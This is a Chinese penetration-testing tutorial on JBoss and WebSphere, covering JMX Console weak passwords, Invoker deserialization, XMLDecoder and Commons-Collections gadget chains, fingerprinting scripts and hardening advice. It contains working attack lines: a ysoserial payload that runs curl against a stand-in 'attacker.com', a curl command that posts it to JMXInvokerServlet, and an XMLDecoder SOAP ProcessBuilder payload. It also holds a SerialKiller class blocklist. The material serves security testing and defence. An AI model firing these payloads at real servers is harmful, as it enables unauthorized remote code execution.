---
title: JBoss与WebSphere安全测试
date: 2026-02-12 09:54:02
tags:
  - 框架安全
  - 渗透测试
description: JBoss 与 WebSphere 安全测试——JMX Console 弱口令与反序列化漏洞。
categories: 渗透测试
---

## 概述

在企业级Java应用服务器中，JBoss（现WildFly）和IBM WebSphere长期占据核心地位。它们承载着金融交易、客户数据等敏感业务，因此成为攻击者的高价值目标。本文从渗透测试视角，深入分析这两款应用服务器的常见攻击面、历史高危漏洞及实战检测方法。

---

## JBoss 安全测试

### 1. JMX Console 弱口令

JBoss的JMX Console通过`/jmx-console`路径暴露MBean管理接口。老版本（4.x/5.x）默认不启用认证，任何访问者均可直接操作MBean。即使启用认证，默认凭据也常被保留：

| 默认用户名 | 默认密码 |
|-----------|---------|
| admin     | admin   |

**检测方法：**

```bash
# 检测未授权访问
curl -s -o /dev/null -w "%{http_code}" http://target:8080/jmx-console/

# 若返回200，列出所有MBean
curl -s "http://target:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=Server"
```

**利用方式：** 通过`jboss.deployment:flavor=URL` MBean远程部署WAR包实现代码执行。可使用Metasploit的`auxiliary/scanner/http/jboss_vulnscan`模块批量扫描。

**防御：** 删除`/jmx-console`路径，使用JAAS配置细粒度权限，限制访问来源IP。

### 2. Invoker Servlet 反序列化

JBoss HTTP Invoker通过`/invoker/JMXInvokerServlet`等端点接收Java序列化对象并直接反序列化。若ClassPath中存在可利用的gadget chain（如Apache Commons-Collections），攻击者可触发远程代码执行。

**常见Invoker路径：**

```
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly
```

**Python检测脚本：**

```python
import requests

target = "http://192.168.1.100:8080"
invoker_paths = [
    "/invoker/JMXInvokerServlet",
    "/invoker/EJBInvokerServlet",
    "/invoker/readonly"
]
# Java序列化魔数
magic = bytes([0xac, 0xed, 0x00, 0x05])

for path in invoker_paths:
    url = target + path
    try:
        resp = requests.post(url, data=magic,
            headers={"Content-Type": "application/x-java-serialized-object"},
            timeout=5)
        if resp.status_code != 404:
            print(f"[+] 发现端点: {path} (状态码: {resp.status_code})")
    except:
        pass
```

**利用命令：**

```bash
# ysoserial生成payload
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/s" > payload.bin

# 发送payload
curl -X POST -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin http://target:8080/invoker/JMXInvokerServlet
```

### 3. 其他JBoss攻击面

| 组件 | 路径 | 风险 |
|------|------|------|
| Web Console | `/web-console/` | 信息泄露、弱口令 |
| Status Servlet | `/status?full=true` | 配置信息泄露 |
| Admin Console | `/admin-console/` | 弱口令、认证绕过 |

---

## WebSphere 安全测试

### 1. XMLDecoder 反序列化（CVE-2017-10271）

**说明：** CVE-2017-10271直接影响Oracle WebLogic Server的WLS Security组件。该漏洞利用`/wls-wsat/CoordinatorPortType`端点接收的XML SOAP请求，在`<java>`标签中嵌入恶意XMLDecoder指令实现RCE。WebSphere虽不受此CVE直接影响，但其SOAP Connector和Admin Console在历史上也存在类似的XML解析安全问题，本节一并对比分析。

**WebSphere相关CVE：**

| CVE编号 | 影响版本 | 漏洞类型 |
|---------|---------|---------|
| CVE-2015-7450 | WAS 7.0-8.5 | Java反序列化RCE |
| CVE-2019-4279 | WAS 8.5-9.0 | IIOP反序列化 |
| CVE-2015-2017 | WAS 8.0-8.5 | XML外部实体注入（XXE） |

**XMLDecoder利用示例：**

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>cmd</string></void>
            <void index="1"><string>/c</string></void>
            <void index="2"><string>calc.exe</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**检测脚本：**

```python
import requests

target = "http://192.168.1.100:7001"
paths = [
    "/wls-wsat/CoordinatorPortType",
    "/wls-wsat/RegistrationPortTypeRPC",
    "/wls-wsat/ParticipantPortType"
]

for path in paths:
    url = target + path
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code in [200, 500]:
            print(f"[+] 发现端点: {path} ({resp.status_code})")
    except:
        pass
```

### 2. Commons-Collections 反序列化（CVE-2015-7501）

**漏洞详情：** CVE-2015-7501影响Apache Commons-Collections 3.2.2之前版本。FoxGlove Security在2015年公开了利用`InvokerTransformer`和`ChainedTransformer`构造gadget chain的技术，引发了Java反序列化安全地震。

**Gadget Chain核心流程：**

```
ObjectInputStream.readObject()
  └── AnnotationInvocationHandler.readObject()
       └── LazyMap.get()
            └── ChainedTransformer.transform()
                 ├── ConstantTransformer → Runtime.class
                 ├── InvokerTransformer → getMethod("getRuntime")
                 ├── InvokerTransformer → invoke(null)
                 └── InvokerTransformer → exec("command")
```

**JBoss与WebSphere对比：**

| 维度 | JBoss | WebSphere |
|------|-------|-----------|
| 默认引入CC库 | 是（4.x/5.x/6.x） | 是（部分版本） |
| Invoker入口 | HTTP Invoker Servlet | IIOP/CORBA |
| 利用难度 | 较低（HTTP直传） | 中等（IIOP协议） |
| 常见gadget | CommonsCollections5/6 | CommonsCollections2/4 |
| JNDI注入配合 | 可用 | 可用 |

### 3. WebSphere Admin Console 检测

WebSphere的ISC（Integrated Solutions Console）通常部署在`/ibm/console/`路径，默认HTTPS端口9043：

```bash
# 检测Admin Console
curl -s -k https://target:9043/ibm/console/login.jsp | grep -o "IBM WebSphere"

# IIOP端口探测
nmap -p 2809,9100,9101,9402,9403 --script giop-info target
```

---

## 综合对比分析

### 安全特性对比

| 特性 | JBoss (WildFly) | WebSphere |
|------|----------------|-----------|
| **默认管理端口** | 8080、9990 | 9060、9043、8880 |
| **管理界面** | `/jmx-console`、`/admin-console` | `/ibm/console/` |
| **认证机制** | HTTP Basic（properties） | LDAP/OS注册表/Federated |
| **序列化协议** | Java Ser（HTTP） | Java Ser（IIOP/HTTP） |
| **历史高危CVE数** | 15+ | 20+ |
| **JNDI注入风险** | 默认开启Naming Service | 内置CosNaming |

### 攻击路径适用性矩阵

| 攻击技术 | JBoss | WebSphere | 难度 |
|---------|-------|-----------|------|
| JMX弱口令 | 高 | 中 | 低 |
| HTTP反序列化 | 高 | 中 | 中 |
| IIOP反序列化 | 低 | 高 | 高 |
| XMLDecoder RCE | 低 | 中 | 中 |
| JNDI注入 | 高 | 高 | 中 |
| XXE注入 | 中 | 中 | 低 |

---

## 指纹识别脚本

```bash
#!/bin/bash
# JBoss/WebSphere 指纹识别
TARGET="$1"

JBOSS_PATHS=(
    "/jmx-console/" "/web-console/"
    "/invoker/JMXInvokerServlet" "/status?full=true"
)
WAS_PATHS=(
    "/ibm/console/login.jsp" "/ibm/console/logon.jsp"
    "/wps/portal/" "/ibm/help/"
)

echo "[*] 检测JBoss特征..."
for p in "${JBOSS_PATHS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -k "$TARGET$p")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  [+] $p -> $code"
done

echo "[*] 检测WebSphere特征..."
for p in "${WAS_PATHS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -k "$TARGET$p")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  [+] $p -> $code"
done

echo "[*] 响应头分析:"
curl -sI -k "$TARGET" | grep -iE "server|x-powered-by"
```

---

## 版本漏洞速查表

### JBoss漏洞映射

| 版本 | CVE | 利用方式 | 严重度 |
|------|-----|---------|--------|
| JBoss 4.x | 无CVE | JMX Console默认无认证 | 严重 |
| JBoss 4.x-5.x | CVE-2010-0738 | JMX Console认证绕过 | 高危 |
| JBoss 5.x-6.x | CVE-2015-7501 | Invoker反序列化（CC库） | 严重 |
| JBoss 6.x | CVE-2017-12149 | HTTP Invoker反序列化 | 严重 |
| JBoss 7.x/EAP 6.x | CVE-2013-4810 | EJB Invoker反序列化 | 高危 |

### WebSphere漏洞映射

| 版本 | CVE | 利用方式 | 严重度 |
|------|-----|---------|--------|
| WAS 7.0-8.5 | CVE-2015-7450 | Java反序列化RCE | 严重 |
| WAS 7.0-8.5 | CVE-2015-2017 | XXE信息泄露 | 中危 |
| WAS 8.5-9.0 | CVE-2019-4279 | IIOP反序列化 | 严重 |
| WAS 8.5.5-9.0.5 | CVE-2020-4450 | IIOP反序列化RCE | 严重 |
| WAS Liberty | CVE-2021-20490 | HTTP请求走私 | 中危 |

---

## 防御加固建议

### JBoss/WildFly

- 升级至最新EAP 7.x或WildFly 28+
- 删除或禁用非必要的应用和Servlet
- 所有管理接口启用强认证（JAAS + RBAC）
- 限制JMX Console访问IP（`jboss.bind.address.management`）
- 移除ClassPath中旧版Commons-Collections库
- 启用Java Security Manager并配置白名单

### WebSphere

- 及时应用IBM iFix和Fix Pack
- 启用Global Security并配置强密码策略
- 禁用不使用的协议（如不需要IIOP则关闭ORB监听）
- 为Admin Console配置双因素或证书认证
- 修改默认SOAP Connector端口（8880）并限制来源IP
- 审计`security.xml`中的权限配置

### 运行时防护（RASP示例）

```bash
# SerialKiller代理拦截危险反序列化类
JAVA_OPTS="$JAVA_OPTS -javaagent:/opt/rasp/serialkiller.jar"
```

```xml
<!-- serialkiller.conf 核心黑名单 -->
<regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer</regexp>
<regexp>org\.apache\.commons\.collections4\.functors\.InvokerTransformer</regexp>
<regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl</regexp>
<regexp>java\.lang\.ProcessBuilder</regexp>
```

### 网络层防御

| 层级 | 措施 | 效果 |
|------|------|------|
| WAF | 阻断反序列化攻击特征 | 高 |
| NGFW | 管理端口仅允许运维网段 | 高 |
| IDS/IPS | 检测AC ED 00 05魔数 | 中（可绕过） |
| NTA | Java序列化流量行为分析 | 中 |

---

## 免责声明

**重要提醒：** 本文所述安全测试技术仅供合法安全评估和授权渗透测试使用。作者及发布平台对以下行为不承担法律责任：

1. 任何未经系统所有者明确书面授权的安全测试行为
2. 将本文技术用于非法入侵、数据窃取或系统破坏
3. 因本文内容导致的直接或间接损失

**合规要求：**
- 生产环境安全测试前必须获得客户书面授权
- 遵守《中华人民共和国网络安全法》《数据安全法》及相关法律法规
- 漏洞发现后按负责任披露原则通知厂商
- 渗透测试工具的使用须遵守其许可协议

**参考资源：**
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [FoxGlove Security Research (2015)](https://foxglovesecurity.com/2015/11/06/)
- [Red Hat JBoss EAP Security Guide](https://access.redhat.com/documentation/en-us/red_hat_jboss_enterprise_application_platform/)
- [IBM WebSphere Security Documentation](https://www.ibm.com/docs/en/was)

**更新日期：2026年3月10日**

---

*安全测试是一把双刃剑——善用者可保障系统长治久安，滥用者则置业务于险境。请秉持白帽精神，守护互联网安全。*
